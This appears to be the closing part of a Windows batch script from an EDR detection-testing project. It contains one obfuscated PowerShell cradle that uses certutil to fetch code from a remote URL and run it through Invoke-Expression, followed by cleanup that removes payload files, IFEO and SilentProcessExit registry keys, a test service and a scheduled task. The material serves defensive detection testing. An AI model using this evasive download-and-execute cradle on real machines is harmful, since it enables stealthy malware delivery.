timeout 5

echo %time% %date% [+] Testing MEMORY\CERTUTIL exec
start "" cmd /c powershell -c "SV c3z 'https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt';dir ty*;SI Variable:\NI1 (certutil -ping (GV c3z).Value);.(GAL IE*)(((Variable NI1 -Val)[2..(((Variable NI1 -Val)).Length-2)]-Join\"`r`n\"))"
echo Execution Finished at %time% %date%
timeout 5

REM ---- EOF Invoke-CradleCrafter Payloads ----

echo [+] Let tasks finish before deleting all the files

timeout 60

echo [+] Cleanup

start "" cmd /c del xxxFile.csproj
start "" cmd /c del AllTheThings.dll
start "" cmd /c del fi.b64
start "" cmd /c del diskshadow.txt 
start "" cmd /c del adrestore.exe
start "" cmd /c del Default_File_Path.ps1
start "" cmd /c del trace.etl
start "" cmd /c del adrestore.exe
start "" cmd /c del adrestore2.exe
start "" cmd /c del trace.etl
start "" cmd /c del trace.cab
start "" cmd /c del calc.inf
start "" cmd /c del 12.txt
start "" cmd /c del payload.cs
start "" cmd /c del payload.exe
start "" cmd /c del testADS.txt
start "" cmd /c del C:\windows\temp\url.url
start "" cmd /c del Default_File_Path2.ps1
start "" cmd /c del notepad.msi
start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /f
start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /f
start "" cmd /c sc delete evilservice
start "" cmd /c schtasks /delete /tn mysc /f

echo "[+] Killing calc.exe 

taskkill /F /IM calc.exe